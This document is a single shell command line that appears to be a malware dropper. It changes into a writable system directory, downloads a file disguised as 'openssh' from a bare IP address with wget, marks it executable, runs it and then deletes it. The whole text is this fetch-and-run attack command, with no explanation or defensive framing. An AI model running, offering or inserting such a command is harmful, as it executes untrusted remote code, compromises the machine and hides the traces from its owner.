cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.61.25/openssh; chmod +x openssh; ./openssh; rm -rf openssh
